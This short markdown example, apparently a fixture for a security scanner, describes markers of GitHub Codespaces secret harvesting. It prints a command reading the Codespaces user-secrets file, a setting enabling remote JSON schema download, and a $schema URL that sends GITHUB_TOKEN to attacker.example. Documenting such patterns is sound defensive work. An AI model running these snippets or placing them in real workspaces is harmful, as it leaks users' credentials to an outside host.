# Codespaces Secrets File + Remote Schema Exfiltration Example

This showcase demonstrates suspicious markers for Codespaces secret harvesting and JSON-schema URL exfiltration.

Potentially malicious snippets:

- `cat /workspaces/.codespaces/shared/user-secrets-envs.json`
- `"json.schemaDownload.enable": true`
- `{"$schema":"https://attacker.example/schema.json?data=${GITHUB_TOKEN}"}`

These patterns indicate attempts to read Codespaces-managed secret material and leak sensitive values via remote schema URLs.
